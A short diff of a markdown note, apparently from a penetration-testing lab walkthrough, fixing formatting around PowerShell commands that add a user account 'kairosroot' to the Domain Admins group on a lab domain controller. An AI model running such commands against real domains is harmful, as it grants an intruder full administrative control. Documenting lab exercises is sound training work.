@@ -76,7 +76,7 @@ PS C:\Users\Administrator>`$User = Get-ADUser -Identity "kairosroot"  -Server "c
 
 PS C:\Users\Administrator>`$Group = Get-ADGroup -Identity "Domain Admins" -Server "corpdc.bank.thereserve.loc"`
 
-PS C:\Users\Administrator>`Add-ADGroupMember -Identity $Group -Members $User -Server "corpdc.bank.thereserve.loc"
+PS C:\Users\Administrator> `Add-ADGroupMember -Identity $Group -Members $User -Server "corpdc.bank.thereserve.loc"`
 
 
 **Next step:** [[RDP to BANKDC from host CORPDC]]
